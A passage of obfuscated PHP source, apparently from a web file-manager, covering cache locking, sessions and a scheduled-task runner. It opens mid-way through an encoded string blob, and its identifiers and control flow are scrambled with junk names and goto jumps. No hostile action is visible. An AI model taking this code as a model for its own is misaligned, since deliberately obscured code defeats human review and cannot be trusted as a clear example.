iRJSGerPU0AJU')."\347\152\127\120\253\222\175\166\224\265\207\243\5\72\252\24\367\262\171\101\135\262\250\222\253\3\175\224\272\100\270\114\313\364\362\132\320\17\306\42\205\146\252\61\101"."\221\310\376\31\156\234\117\73\111\13\167\142\266\353\50\56\200\133\36\220\213\134\330\240\44\34\164\361\173\140\213\342\64\76\234\311\5\70\176\7\253\207\217\242\354"."\xed\x3\xca\x3e\xe\x7c\xe6\xe1\x6c\xf8\x5d\x70\x7\xcc\xb\x6b\x39\xf4\x3b\x53\x33\x4d\x4a\x2a\x80\x48\x8e\x4a\x22\xe\xc\x1e\x5c\xe\x41\x89\x0\x84\xf8\x43\x7\x84\x22\xba\x7b"."\x47\xf8\x86\xe8\x2\xa\x92\x17\x39\x28\xd\x86\x14\x9c\x8b\xa8\x89\x25\x2\xef\xf4\x59\x44\x3c\x97\xc8\x33\x5a\x63\xde\xf6\x16\xc8\x13\x80\x84\x17\xd5\x6\xa9\xd3\x31\x68\x8c\xc9".base64_decode('x8O/VirbuSz+lE/wTVSJQCavhhvnuInnVidqw0m8fPTkkpbq2J89UwX8uRbI').strrev('¼ò¾ë@æ¶¬‚“íµFÈ,€;°@¡Byµd/®w©·Ğ=7Dt{o!u')."\55\36\237\277\40\17\152\243\264\106\270\157\32\234\345\153\103\243\364\370\375\201\216\175\215\302\127\77\213\217\4\275\166\362\373\350\134\112\243\227\313\364\332\76\44"."\xa7\x9\x4e\x89\x76\x5c\x4a\x86\x3b\x2c\xe2\x75\xac\xf2\xbb\xb8\xae\x6\xf5\xdc\xc5\x2\x56\x37\xe9\x36\xc5\x30\x8a\xb0\xa4\x21\xa8\x49\xd2\x4a\xda\xe\xe6\x48\x2a\x74\x88\xc9\x36"."\67\343\144\321\204\354\12\150\252\260\17\360\333\256\313\362\40\54\244\243\215\203\310\215\200\220\342\121\212\22\52\212\102\117\274\336\54\274\156\107\271\34\72\160\324"."\147\150\104\217\251\107\213\12\327\351\130\310\40\306\125\4\336\202\52\21\16\223\354\377\1\202\256\57\241\63\233\0\0"."", 10, -8))); goto eö»Äˆ³áà; cäÈçôŠ‘Ò: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto b•‡œ…„”; fì§ÁÆ’: self::$timeout = $Eæ©§™µµó[$a´ İªìÓ©[785]] ? $Eæ©§™µµó[$a´ İªìÓ©[785]] : 10; $DˆÊ‘¢«Ë = _get($GLOBALS[$a´ İªìÓ©[6]], $a´ İªìÓ©[786]); $b›Á¶“Â”² = $Eæ©§™µµó[$a´ İªìÓ©[772]] ? $Eæ©§™µµó[$a´ İªìÓ©[772]] : $a´ İªìÓ©[173]; goto Bà•è£ƒÀÆ; Bà•è£ƒÀÆ: if ($b›Á¶“Â”² == $a´ İªìÓ©[17] && $DˆÊ‘¢«Ë == $a´ İªìÓ©[9]) { $b›Á¶“Â”² = $a´ İªìÓ©[173]; } switch ($b›Á¶“Â”²) { case $a´ İªìÓ©[775]: self::$handle = new CacheLockRedis(); break; case $a´ İªìÓ©[776]: self::$handle = new CacheLockMemcached(); break; case $a´ İªìÓ©[17]: self::$handle = new CacheLockDatabase(); break; case $a´ İªìÓ©[173]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto e¤ìÚéò®‚; b•‡œ…„”: $a´ İªìÓ© =& $_SERVER[¹…ÕÄ]; if (self::$handle) { return self::$handle; } $Eæ©§™µµó = $GLOBALS[$a´ İªìÓ©[6]][$a´ İªìÓ©[345]]; goto fì§ÁÆ’; e¤ìÚéò®‚: } private static function key($a®ãÇ·»‚ó) { return $_SERVER[¹…ÕÄ][787] . Cache::key($a®ãÇ·»‚ó); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($DØİ‰¸‡Ğ = '') { self::$errorMsg = $DØİ‰¸‡Ğ; } public static function lockGlobal($f³°›¨¯, $aÆáìŒ‘Œ) { return self::lock($f³°›¨¯, $aÆáìŒ‘Œ, !0); } public static function lock($Bğçó…ÆƒŠ, $B»Õˆî˜®  = false, $A²Ÿ‡ÕÃø™ = false) { goto d–Ñ‘Ü©ô‹; c ¨ˆá†°£: $B»Õˆî˜®  = $B»Õˆî˜®  ? $B»Õˆî˜®  : self::$timeout; $cªïÉ’„öì = $e°à¬Öö«‰->lock($aß’ËË«‘, $B»Õˆî˜® ); if (!$cªïÉ’„öì) { $E´É‡›·½ = "\x6c\157\x63\x6b\x20\145\162\162\157\162\x3b\x6b\145\171\75{$Bğçó…ÆƒŠ}\73\164\x69\155\145\x3d{$B»Õˆî˜® }\x3b" . self::$errorMsg . $bï•ƒÅáõ’[67] . get_caller_msg(); $C¼êÙĞ ãİ = LNG($bï•ƒÅáõ’[788]) . "\50{$B»Õˆî˜® }\163\51\x2e" . LNG($bï•ƒÅáõ’[789]); $C¼êÙĞ ãİ .= $bï•ƒÅáõ’[790]; if (is_string(self::$errorMsg) && self::$errorMsg) { $C¼êÙĞ ãİ = $C¼êÙĞ ãİ . $bï•ƒÅáõ’[791] . self::$errorMsg; } write_log($E´É‡›·½, $bï•ƒÅáõ’[792]); show_json($C¼êÙĞ ãİ, !1); } goto dë ¾éÛÀ; dë ¾éÛÀ: if (!$A²Ÿ‡ÕÃø™) { self::$lockItem[$aß’ËË«‘] = !0; } return $cªïÉ’„öì; goto A…÷¥Ëéğ²; d–Ñ‘Ü©ô‹: $bï•ƒÅáõ’ =& $_SERVER[¹…ÕÄ]; $e°à¬Öö«‰ = self::init(); $aß’ËË«‘ = self::key($Bğçó…ÆƒŠ); goto c ¨ˆá†°£; A…÷¥Ëéğ²: } public static function lockGet($d…ÍÜÄèí°) { $e £Ä˜ï‰ä = self::key($d…ÍÜÄèí°); if (self::$lockItem[$e £Ä˜ï‰ä]) { return self::$lockItem[$e £Ä˜ï‰ä]; } return self::init()->lockGet($e £Ä˜ï‰ä); } public static function unlock($Fµ…‹«²ø) { $DÔšğİÒ¾– = self::key($Fµ…‹«²ø); self::$lockItem[$DÔšğİÒ¾–] = null; return self::init()->unlock($DÔšğİÒ¾–); } public static function unlockRuntime() { $dÄ™À­¤ =& $_SERVER[¹…ÕÄ]; $f‹³•¥¯¶³ = self::init(); $cµö”Óù”  = !1; foreach (self::$lockItem as $fğ¹‚·ãÜè => $D‹æ‰»÷ÔÅ) { if (!$D‹æ‰»÷ÔÅ) { continue; } $f‹³•¥¯¶³->unlock($fğ¹‚·ãÜè); if (!$cµö”Óù” ) { $cµö”Óù”  = !0; write_log($dÄ™À­¤[793] . $fğ¹‚·ãÜè . $dÄ™À­¤[67] . get_caller_msg(), $dÄ™À­¤[792]); continue; } write_log($dÄ™À­¤[793] . $fğ¹‚·ãÜè, $dÄ™À­¤[792]); } self::fileUnlockAll(); } public static function fileLock($aÀ™Ë”‚í) { goto fˆöºİ”–; d»»ÁÁõËÊ: $e²æŞÅ™Š§ = fopen(DATA_PATH . $aÀ™Ë”‚í . $fìæš¬Ì´[795], $fìæš¬Ì´[796]); if (!$e²æŞÅ™Š§) { return !1; } $GLOBALS[$fìæš¬Ì´[794]][$aÀ™Ë”‚í] = $e²æŞÅ™Š§; goto B„Ÿ˜–é·; B„Ÿ˜–é·: if (flock($e²æŞÅ™Š§, LOCK_EX)) { return !0; } self::unlock($aÀ™Ë”‚í); show_json($fìæš¬Ì´[797], !1); goto bÈ„¢‘ˆìá; fˆöºİ”–: $fìæš¬Ì´ =& $_SERVER[¹…ÕÄ]; if (!$GLOBALS[$fìæš¬Ì´[794]]) { $GLOBALS[$fìæš¬Ì´[794]] = array(); } $GLOBALS[$fìæš¬Ì´[794]][$aÀ™Ë”‚í] = !1; goto d»»ÁÁõËÊ; bÈ„¢‘ˆìá: return !1; goto d¦–ÓÖ©’œ; d¦–ÓÖ©’œ: } public static function fileUnlock($dÁÀÎ‘¸ôÖ) { $c¯¤©’çÛÎ =& $_SERVER[¹…ÕÄ]; $cÀÂ†Û±Š = $GLOBALS[$c¯¤©’çÛÎ[794]][$dÁÀÎ‘¸ôÖ]; if (!$cÀÂ†Û±Š) { return; } $GLOBALS[$c¯¤©’çÛÎ[794]][$dÁÀÎ‘¸ôÖ] = !1; flock($cÀÂ†Û±Š, LOCK_UN); fclose($cÀÂ†Û±Š); } public static function fileUnlockAll() { $C›àš®†Ï» =& $_SERVER[¹…ÕÄ]; if (!$GLOBALS[$C›àš®†Ï»[794]]) { return; } foreach ($GLOBALS[$C›àš®†Ï»[794]] as $fÒ•ÙŠè÷¤ => $cˆ³Ï‚´Î) { if (!$cˆ³Ï‚´Î) { continue; } $GLOBALS[$C›àš®†Ï»[794]][$fÒ•ÙŠè÷¤] = !1; flock($cˆ³Ï‚´Î, LOCK_UN); fclose($cˆ³Ï‚´Î); } $GLOBALS[$C›àš®†Ï»[794]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $C¡…´¢ÑÑ­ =& $_SERVER[¹…ÕÄ]; $Dæ‰—âØ¦¼ = $GLOBALS[$C¡…´¢ÑÑ­[6]][$C¡…´¢ÑÑ­[345]]; self::$cachePath = $Dæ‰—âØ¦¼[$C¡…´¢ÑÑ­[173]][$C¡…´¢ÑÑ­[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($AˆœôÕÑ‡, $Cé‘ŒÅÃÉ = 0) { goto bæèé×éâ×; C‚ãóç×ï™: $Føª¿ö…ƒ = rtrim(self::$cachePath, $dÃÅ½µæ®Ì[8]) . $dÃÅ½µæ®Ì[798] . md5($AˆœôÕÑ‡) . $dÃÅ½µæ®Ì[795]; if (file_exists($Føª¿ö…ƒ) && filemtime($Føª¿ö…ƒ) && filemtime($Føª¿ö…ƒ) < time() - 10) { @unlink($Føª¿ö…ƒ); } do { if (file_exists($Føª¿ö…ƒ)) { cacheLockWait(); continue; } $fÛ“‹Á“ˆ = fopen($Føª¿ö…ƒ, $dÃÅ½µæ®Ì[799]); if (!$fÛ“‹Á“ˆ) { return !1; } $c‘ùªÀ¼Š = flock($fÛ“‹Á“ˆ, LOCK_EX | LOCK_NB); self::$caches[$AˆœôÕÑ‡] = array($dÃÅ½µæ®Ì[800] => $fÛ“‹Á“ˆ, $dÃÅ½µæ®Ì[173] => $Føª¿ö…ƒ); fwrite($fÛ“‹Á“ˆ, $DÒ°‡¿Õ¿½); clearstatcache(); if ($fÛ“‹Á“ˆ && $c‘ùªÀ¼Š) { return !0; } cacheLockWait(); } while (microtime(!0) < $DÒ°‡¿Õ¿½); goto a²ºçïÍÈ; a²ºçïÍÈ: $this->unlock($AˆœôÕÑ‡); return !1; goto dŸù´ô’Œ•; bæèé×éâ×: $dÃÅ½µæ®Ì =& $_SERVER[¹…ÕÄ]; $EçÎÁöÍ´Ã = microtime(!0); $DÒ°‡¿Õ¿½ = $EçÎÁöÍ´Ã + $Cé‘ŒÅÃÉ + 0.0001; goto C‚ãóç×ï™; dŸù´ô’Œ•: } public function lockGet($aŠáñå¾·) { $cì³–Û’Õ‚ =& $_SERVER[¹…ÕÄ]; $Fö˜ôí³°ö = rtrim(self::$cachePath, $cì³–Û’Õ‚[8]) . $cì³–Û’Õ‚[798] . md5($aŠáñå¾·) . $cì³–Û’Õ‚[795]; return file_exists($Fö˜ôí³°ö); } public function unlock($B´Ê¼‡¨ñº) { goto C‚é«í©š¿; f„—§ŒØÔˆ: unset(self::$caches[$B´Ê¼‡¨ñº]); goto bÖ—‹¥¿ÀÍ; C‚é«í©š¿: $b³ÛÔ‚ÊÇÚ =& $_SERVER[¹…ÕÄ]; $f¿¿§“•˜ = self::$caches[$B´Ê¼‡¨ñº]; if (!$f¿¿§“•˜) { return; } goto EŒÑœÃ¯ÓÚ; EŒÑœÃ¯ÓÚ: @flock($f¿¿§“•˜[$b³ÛÔ‚ÊÇÚ[800]], LOCK_UN); @fclose($f¿¿§“•˜[$b³ÛÔ‚ÊÇÚ[800]]); @unlink($f¿¿§“•˜[$b³ÛÔ‚ÊÇÚ[173]]); goto f„—§ŒØÔˆ; bÖ—‹¥¿ÀÍ: } } goto Fç§™È¹×Â; c®©¹¢æöÎ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto dÓ¡óŠ´»; fºİğ¯ìÛÈ: $EÔ…ãëá«– = $GLOBALS[$EÊ²­¤òµÃ[6]][$EÊ²­¤òµÃ[345]]; self::$sessionTime = $EÔ…ãëá«–[$EÊ²­¤òµÃ[1463]]; $F²àªœ½‚ = isset($GLOBALS[$EÊ²­¤òµÃ[1464]]) ? $GLOBALS[$EÊ²­¤òµÃ[1464]] : SESSION_ID; goto A³åå”‰é; e¨‡âóÎ: $Fë†•œ­ = $EÔ…ãëá«–[$eäŠ¼ÙÙƒá]; $d¾½¨Ä†«³ = $EÔ…ãëá«–[$EÊ²­¤òµÃ[773]]; switch ($eäŠ¼ÙÙƒá) { case $EÊ²­¤òµÃ[17]: self::$handle = Model($EÊ²­¤òµÃ[774]); break; case $EÊ²­¤òµÃ[775]: self::$handle = new CacheRedis($Fë†•œ­, $d¾½¨Ä†«³); break; case $EÊ²­¤òµÃ[776]: self::$handle = new CacheMemcached($Fë†•œ­, $d¾½¨Ä†«³); break; case $EÊ²­¤òµÃ[173]: $Fë†•œ­[$EÊ²­¤òµÃ[75]] = $Fë†•œ­[$EÊ²­¤òµÃ[75]] . $EÊ²­¤òµÃ[1466]; self::$handle = new CacheFile($Fë†•œ­, $d¾½¨Ä†«³); default: break; } goto b’“Éò„„Ş; dÓ¡óŠ´»: $EÊ²­¤òµÃ =& $_SERVER[¹…ÕÄ]; static $a®ù¹ÁÀÚ = false; if ($a®ù¹ÁÀÚ) { return $a®ù¹ÁÀÚ; } goto fºİğ¯ìÛÈ; A³åå”‰é: if (self::$sessionSign) { } else { if (Cookie::get($F²àªœ½‚)) { self::$sessionSign = Cookie::get($F²àªœ½‚); } else { self::$sessionSign = guid(); } } Cookie::setSafe($F²àªœ½‚, self::$sessionSign, self::$sessionTime); $eäŠ¼ÙÙƒá = $EÔ…ãëá«–[$EÊ²­¤òµÃ[1465]]; goto e¨‡âóÎ; b’“Éò„„Ş: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $a®ù¹ÁÀÚ = new self(); return $a®ù¹ÁÀÚ; goto cè¤ªÍõõõ; cè¤ªÍõõõ: } public static function sign($bæ³èİºğ = false) { $bæ³èİºğ && (self::$sessionSign = $bæ³èİºğ); self::init(); return self::$sessionSign; } public static function set($eÈ¥‡‰›»Ê, $a«£Æ‚¥ = false) { self::init(); if (is_array($eÈ¥‡‰›»Ê)) { foreach ($eÈ¥‡‰›»Ê as $bÍÏÛŸê„¢ => $cŠ¯ë‚¸ÈÒ) { array_set_value(self::$data, $bÍÏÛŸê„¢, $cŠ¯ë‚¸ÈÒ); } } else { array_set_value(self::$data, $eÈ¥‡‰›»Ê, $a«£Æ‚¥); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($FÀø–—ºø = false) { self::init(); if (!$FÀø–—ºø) { return self::$data; } return array_get_value(self::$data, $FÀø–—ºø); } public static function remove($fŠ‰¬ÌÑÌŒ) { self::init(); unset(self::$data[$fŠ‰¬ÌÑÌŒ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¹…ÕÄ][778])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto aß­£›éÊ…; aß­£›éÊ…: $E®ñ¨×§Âß =& $_SERVER[¹…ÕÄ]; if (self::valueGet($E®ñ¨×§Âß[705]) != $E®ñ¨×§Âß[86]) { return; } if (self::valueGet($E®ñ¨×§Âß[1467]) == $E®ñ¨×§Âß[86]) { $b¨”š¶Êé = self::valueGet($E®ñ¨×§Âß[1468]); if (time() - $b¨”š¶Êé > 3600 * 2) { self::restart(); } return; } goto C»ÕóîİÎ¼; EèçÂÛ¸ŞÏ: while (!0) { self::cacheClear(); if (self::valueGet($E®ñ¨×§Âß[705]) != $E®ñ¨×§Âß[86]) { self::valueSet($E®ñ¨×§Âß[1467], $E®ñ¨×§Âß[491]); self::log($E®ñ¨×§Âß[1471]); die; } self::valueSet($E®ñ¨×§Âß[1467], $E®ñ¨×§Âß[86]); self::valueSet($E®ñ¨×§Âß[1468], time()); self::taskRunAll(); sleep(self::valueGet($E®ñ¨×§Âß[1472])); } goto bóìøêÓô—; C»ÕóîİÎ¼: http_close(); self::valueSet($E®ñ¨×§Âß[1467], $E®ñ¨×§Âß[86]); Hook::bind($E®ñ¨×§Âß[1469], $E®ñ¨×§Âß[1470]); goto EèçÂÛ¸ŞÏ; bóìøêÓô—: } public static function restart() { $BÁöñÁƒÚ =& $_SERVER[¹…ÕÄ]; http_close(); self::valueSet($BÁöñÁƒÚ[705], $BÁöñÁƒÚ[491]); sleep(self::valueGet($BÁöñÁƒÚ[1472]) + 5); self::valueSet($BÁöñÁƒÚ[1467], $BÁöñÁƒÚ[491]); self::valueSet($BÁöñÁƒÚ[705], $BÁöñÁƒÚ[86]); } public static function shutdownEvent() { $Cã‡éÃ¬†‡ =& $_SERVER[¹…ÕÄ]; self::valueSet($Cã‡éÃ¬†‡[1467], $Cã‡éÃ¬†‡[491]); self::log($Cã‡éÃ¬†‡[1473]); } public static function config($fĞò‹„‰¯, $A”îÖÚº½Ğ) { $E½ïâ¾£ =& $_SERVER[¹…ÕÄ]; $eùŠ¨Ÿ— = 10; $A”îÖÚº½Ğ = intval($A”îÖÚº½Ğ) <= $eùŠ¨Ÿ— ? $eùŠ¨Ÿ— : intval($A”îÖÚº½Ğ); self::valueSet($E½ïâ¾£[705], $fĞò‹„‰¯); self::valueSet($E½ïâ¾£[1472], $A”îÖÚº½Ğ); } private static function taskRunAll() { goto e¡×¿–ñ; B¾¿Ç¨à¹Ï: $e±ÏÙòÑõ¸ = count($AÅäÕÀÇ); for ($EÇ”¾áª‰¡ = 0; $EÇ”¾áª‰¡ < $e±ÏÙòÑõ¸; $EÇ”¾áª‰¡++) { $A›÷ù½¡Õ = $AÅäÕÀÇ[$EÇ”¾áª‰¡]; if (!$A›÷ù½¡Õ[$Cêåê‚Ñ³è[388]] || $A›÷ù½¡Õ[$Cêåê‚Ñ³è[1475]] != $Cêåê‚Ñ³è[86]) { continue; } if (!self::taskTimeCheck($A›÷ù½¡Õ)) { continue; } self::taskRun($A›÷ù½¡Õ); } Hook::trigger($Cêåê‚Ñ³è[1476]); goto f´„³…ÇŠñ; e¡×¿–ñ: $Cêåê‚Ñ³è =& $_SERVER[¹…ÕÄ]; $A²‰Şë¡Æ = timeFloat(); $AÅäÕÀÇ = Model($Cêåê‚Ñ³è[1474])->listData(); goto B¾¿Ç¨à¹Ï; f´„³…ÇŠñ: self::taskQueueRun($A²‰Şë¡Æ); self::closeDatabase(); goto d¸£ì¯Ó­; d¸£ì¯Ó­: } private static function taskQueueRun($EÃöÃÔŠÁë) { $a©«İ·é•“ = 10; while (!0) { $F¿ÖÌœÁ—ì = TaskQueue::run(); if ($F¿ÖÌœÁ—ì === !1) { break; } if (timeFloat() - $EÃöÃÔŠÁë >= $a©«İ·é•“) { break; } } } private static function taskTimeCheck($AÉíù›Š—¹) { goto AÙñÚôƒŒ; B£ˆ­˜ñé»: switch ($C°É£Û²ÈØ[$c¯Òê£ğ[29]]) { case $c¯Òê£ğ[1483]: if (time() - $B‘ºÓ½ç• < 3600 * 24 * 30) { return !1; } if ($C°É£Û²ÈØ[$c¯Òê£ğ[1483]] == date($c¯Òê£ğ[1484]) && $A»°¯±í´) { return !0; } break; case $c¯Òê£ğ[1485]: if (time() - $B‘ºÓ½ç• < 3600 * 24 * 7) { return !1; } $EÌÏ„İÉÅƒ = date($c¯Òê£ğ[1486]) == 0 ? 7 : date($c¯Òê£ğ[1486]); if ($C°É£Û²ÈØ[$c¯Òê£ğ[1485]] == $EÌÏ„İÉÅƒ && $A»°¯±í´) { return !0; } break; case $c¯Òê£ğ[1478]: if (time() - $B‘ºÓ½ç• < 3600 * 24) { return !1; } if ($A»°¯±í´) { return !0; } break; case $c¯Òê£ğ[1487]: if (time() - $B‘ºÓ½ç• >= floatval($C°É£Û²ÈØ[$c¯Òê£ğ[1487]]) * 60) { return !0; } break; default: break; } return !1; goto C‹—ªÛàÜ; FÏæİÍ±‚: $eå…°Š•…Œ = strtotime($c¯Òê£ğ[1477] . $C°É£Û²ÈØ[$c¯Òê£ğ[1478]] . $c¯Òê£ğ[1479]) - strtotime($c¯Òê£ğ[1480]); $eÅì´ôà¸ = time() - strtotime(date($c¯Òê£ğ[1481]) . $c¯Òê£ğ[1482]); $A»°¯±í´ = $eÅì´ôà¸ >= $eå…°Š•…Œ && $eÅì´ôà¸ <= $eå…°Š•…Œ + 3600; goto B£ˆ­˜ñé»; AÙñÚôƒŒ: $c¯Òê£ğ =& $_SERVER[¹…ÕÄ]; $C°É£Û²ÈØ = json_decode($AÉíù›Š—¹[$c¯Òê£ğ[195]], !0); $B‘ºÓ½ç• = intval($AÉíù›Š—¹[$c¯Òê£ğ[1468]]); goto FÏæİÍ±‚; C‹—ªÛàÜ: } private static function closeDatabase() { goto E«Ø©‹; E«Ø©‹: $Aö”ø¸èÏ =& $_SERVER[¹…ÕÄ]; static $C–ß¹ôâ¿í = 0; $aë¶æ§ó¥› = 1800; goto dö—õ§£öº; dö—õ§£öº: if (!$C–ß¹ôâ¿í) { $C–ß¹ôâ¿í = time(); } if (time() - $C–ß¹ôâ¿í < $aë¶æ§ó¥›) { return; } $C–ß¹ôâ¿í = time(); goto cŒ†„ÁÇæ¤; cŒ†„ÁÇæ¤: $Eİ‡šÒ·Ó” = Model($Aö”ø¸èÏ[497])->db($Aö”ø¸èÏ[33]); if ($Eİ‡šÒ·Ó”) { $Eİ‡šÒ·Ó”->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($Aö”ø¸èÏ[1488], $Aö”ø¸èÏ[1489]); die; } goto C†¿Çõ½Øä; C†¿Çõ½Øä: } public static function taskRun($c¥Ôó­¡Ö) { goto D›±ßÛ¤É¿; D›±ßÛ¤É¿: $Cˆ‰²Âò =& $_SERVER[¹…ÕÄ]; self::log($Cˆ‰²Âò[1490] . $c¥Ôó­¡Ö[$Cˆ‰²Âò[388]] . $Cˆ‰²Âò[1491] . $c¥Ôó­¡Ö[$Cˆ‰²Âò[28]] . $Cˆ‰²Âò[1492] . $c¥Ôó­¡Ö[$Cˆ‰²Âò[1493]]); Model($Cˆ‰²Âò[1474])->run($c¥Ôó­¡Ö[$Cˆ‰²Âò[388]]); goto a¢‡‚äñ÷á; fÂ†î„ñÍğ: Model($Cˆ‰²Âò[1494])->add(array($Cˆ‰²Âò[1495] => $Cˆ‰²Âò[33], $Cˆ‰²Âò[1496] => $Cˆ‰²Âò[491], $Cˆ‰²Âò[29] => $Cˆ‰²Âò[1497] . $c¥Ôó­¡Ö[$Cˆ‰²Âò[388]], $Cˆ‰²Âò[1498] => json_encode(array($Cˆ‰²Âò[28] => $c¥Ôó­¡Ö[$Cˆ‰²Âò[28]], $Cˆ‰²Âò[1499] => timeFloat() - $AÙÁ¼ÃË»Ÿ, $Cˆ‰²Âò[289] => $C¹æ†ÈìÒŸ)))); self::log($Cˆ‰²Âò[1500] . $c¥Ôó­¡Ö[$Cˆ‰²Âò[388]] . $Cˆ‰²Âò[1501] . $C¹æ†ÈìÒŸ); return !0; goto c›ğ”³Ãö; a¢‡‚äñ÷á: $AÙÁ¼ÃË»Ÿ = timeFloat(); $C¹æ†ÈìÒŸ = $Cˆ‰²Âò[33]; switch ($c¥Ôó­¡Ö[$Cˆ‰²Âò[29]]) { case $Cˆ‰²Âò[303]: $D÷£¹»ÚÚ = url_request($c¥Ôó­¡Ö[$Cˆ‰²Âò[1493]], $Cˆ‰²Âò[226], !1, !1, !1, !1, 5); $C¹æ†ÈìÒŸ = strlen($D÷£¹»ÚÚ); break; case $Cˆ‰²Âò[225]: $C¹æ†ÈìÒŸ = Hook::apply($c¥Ôó­¡Ö[$Cˆ‰²Âò[1493]]); default: break; } goto fÂ†î„ñÍğ; c›ğ”³Ãö: } private static function valueGet($F°ÌÕÄêÇ¦) { $FñËÒÃÚÚë =& $_SERVER[¹…ÕÄ]; $E’œùÈé = $FñËÒÃÚÚë[1502]; $C™ÊŠ‡˜—² = Model($FñËÒÃÚÚë[1503])->get($F°ÌÕÄêÇ¦, $E’œùÈé); if (is_null($C™ÊŠ‡˜—²)) { Model($FñËÒÃÚÚë[1503])->set($FñËÒÃÚÚë[1472], 10, $E’œùÈé); Model($FñËÒÃÚÚë[1503])->set($FñËÒÃÚÚë[705], $FñËÒÃÚÚë[86], $E’œùÈé); Model($FñËÒÃÚÚë[1503])->set($FñËÒÃÚÚë[1467], $FñËÒÃÚÚë[491], $E’œùÈé); $C™ÊŠ‡˜—² = Model($FñËÒÃÚÚë[1503])->get($F°ÌÕÄêÇ¦, $E’œùÈé); } return $C™ÊŠ‡˜—²; } private static function valueSet($e³ˆÅ÷á¼, $dšÎïò¿–) { $c©áæâÍ–‘ =& $_SERVER[¹…ÕÄ]; return Model($c©áæâÍ–‘[1503])->set($e³ˆÅ÷á¼, $dšÎïò¿–, $c©áæâÍ–‘[1502]); } protected static function log($AôîôçœÓŒ) { write_log($AôîôçœÓŒ, $_SERVER[¹…ÕÄ][1489]); } private static function cacheClear() { $e’‡ê¬Â =& $_SERVER[¹…ÕÄ]; $F¬‹Ùëİ¢‹ = Model($e’‡ê¬Â[1503])->cacheKey($e’‡ê¬Â[1502]); Cache::clearMemory($F¬‹Ùëİ¢‹); Model($e’‡ê¬Â[1474])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\162\165\156\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($E’âŸÆêÊ, $Fí¸»Ó”ÆÚ = '', $a³Œ«Ê‡» = 0, $eİ·¬º–† = '') { goto D™Ì‚«ºØÎ; e‹± ½™¾õ: $GLOBALS[$bì¾»‡‚±‘[1510]] = 1; Hook::bind($bì¾»‡‚±‘[1469], array($this, $bì¾»‡‚±‘[1511])); Hook::bind($bì¾»‡‚±‘[1512], array($this, $bì¾»‡‚±‘[1513])); goto eíØÇöôµˆ; D™Ì‚«ºØÎ: $bì¾»‡‚±‘ =& $_SERVER[¹…ÕÄ]; if (self::get($E’âŸÆêÊ)) { return; } $this->task = array($bì¾»‡‚±‘[388] => $E’âŸÆêÊ, $bì¾»‡‚±‘[1504] => USER_ID, $bì¾»‡‚±‘[1409] => $eİ·¬º–†, $bì¾»‡‚±‘[29] => $Fí¸»Ó”ÆÚ, $bì¾»‡‚±‘[1002] => $bì¾»‡‚±‘[33], $bì¾»‡‚±‘[1000] => $a³Œ«Ê‡», $bì¾»‡‚±‘[1014] => 0, $bì¾»‡‚±‘[1505] => 0, $bì¾»‡‚±‘[1506] => 0, $bì¾»‡‚±‘[736] => timeFloat(), $bì¾»‡‚±‘[735] => 0, $bì¾»‡‚±‘[1507] => 0, $bì¾»‡‚±‘[1508] => 0, $bì¾»‡‚±‘[1509] => 0, $bì¾»‡‚±‘[705] => $bì¾»‡‚±‘[1467]); goto e‹± ½™¾õ; eíØÇöôµˆ: $this->startAfter(); Hook::trigger($bì¾»‡‚±‘[1514], $this->task); $this->task[$bì¾»‡‚±‘[1507]] = timeFloat(); goto bÑ¢· «; bÑ¢· «: } public function end() { goto cèÉ©²Š’§; c„è¨„Ü¨Ä: $eÍà¶Ò‰÷ = timeFloat() - $this->task[$dµ•ôÊ††[736]]; self::log($dµ•ôÊ††[1515] . $this->task[$dµ•ôÊ††[388]] . $dµ•ôÊ††[1516] . $eÍà¶Ò‰÷ . $dµ•ôÊ††[1517]); Hook::unbind($dµ•ôÊ††[1469], array($this, $dµ•ôÊ††[1511])); goto fÖªŠŠîøŠ; fÖªŠŠîøŠ: Hook::unbind($dµ•ôÊ††[1512], array($this, $dµ•ôÊ††[1513])); $this->endAfter(); $this->task = !1; goto B®‹ÎÉš¥™; cèÉ©²Š’§: $dµ•ôÊ†† =& $_SERVER[¹…ÕÄ]; if (!$this->task) { return; } if ($this->task[$dµ•ôÊ††[1507]]) { self::valueSet($this->task[$dµ•ôÊ††[388]], !1); } goto c„è¨„Ü¨Ä; B®‹ÎÉš¥™: } public function update($B¶­—ŒäèÈ = 0, $EÃà·£ÒêÙ = false) { goto FİÖïøäÊ; E”ª– ‹´¹: $B”¬Ğø¿ = self::get($fÀİ¦×†§[$CìùÆÅ¬åÚ[388]]); $c…Õ³ì‰Óï = $B”¬Ğø¿[$CìùÆÅ¬åÚ[705]]; if ($c…Õ³ì‰Óï == self::STATYS_KILL) { $Cƒİí‡Æé = array($CìùÆÅ¬åÚ[1518] => LNG($CìùÆÅ¬åÚ[1519]), $CìùÆÅ¬åÚ[1064] => !1); Cache::set($CìùÆÅ¬åÚ[1520] . $this->task[$CìùÆÅ¬åÚ[388]], $Cƒİí‡Æé, 30); $this->end(); die; } else { if ($c…Õ³ì‰Óï == self::STATYS_STOP) { $BÒ™Ï¶§ƒ = 2; $B”¬Ğø¿[$CìùÆÅ¬åÚ[1508]] += $BÒ™Ï¶§ƒ; self::valueSet($fÀİ¦×†§[$CìùÆÅ¬åÚ[388]], $B”¬Ğø¿); 